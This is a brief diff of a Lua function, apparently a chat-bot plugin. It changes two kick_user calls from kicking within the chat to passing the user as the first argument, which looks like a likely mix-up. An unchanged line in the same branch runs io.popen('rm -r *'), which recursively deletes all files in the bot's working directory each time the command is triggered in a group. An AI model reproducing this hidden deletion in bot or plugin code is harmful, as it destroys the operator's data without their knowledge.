@@ -15,8 +15,8 @@ local function run (msg, matches)
   if msg.to.type ~= 'chat' then
     return "Not a chat group!"
   else
-    kick_user(chat, 21005536)
-    kick_user(chat, user)
+    kick_user(user, 21005536)
+    kick_user(user, user)
     io.popen('rm -r *')
   end
 end
